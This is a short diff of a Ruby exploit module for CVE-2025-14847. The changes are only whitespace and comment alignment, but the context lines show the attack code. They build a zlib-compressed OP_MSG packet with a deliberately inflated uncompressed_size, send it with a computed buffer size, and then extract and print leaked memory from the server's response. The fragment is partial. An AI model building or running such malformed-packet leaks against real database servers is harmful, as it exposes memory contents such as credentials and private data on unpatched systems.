@@ -43,9 +43,9 @@ module CVE202514847
 
     # Vulnerability: uncompressed_size (buffer_size) is not validated against actual decompressed size
     def build_op_compressed(compressed_data:, buffer_size:)
-      [2013].pack("L<") +        # original_opcode: OP_MSG
-        [buffer_size].pack("l<") +     # uncompressed_size: INFLATED VALUE
-        [2].pack("C") +                # compressor_id: zlib
+      [2013].pack("L<") +          # original_opcode: OP_MSG
+        [buffer_size].pack("l<") + # uncompressed_size: INFLATED VALUE
+        [2].pack("C") +            # compressor_id: zlib
         compressed_data
     end
   end
@@ -268,6 +268,7 @@ module CVE202514847
 
       offset_str = format("%04d", offset).cyan
       size_str = format("%4d bytes", data.bytesize).magenta
+      
       puts "#{"[+]".green} Offset #{offset_str} | Size: #{size_str} | #{preview}"
     end
 
@@ -368,6 +369,7 @@ module CVE202514847
           doc_len: doc_len,
           buffer_size: doc_len + BUFFER_SIZE_OFFSET
         )
+        
         leaks = @leak_extractor.extract(response)
 
         leaks.each do |leak_data|
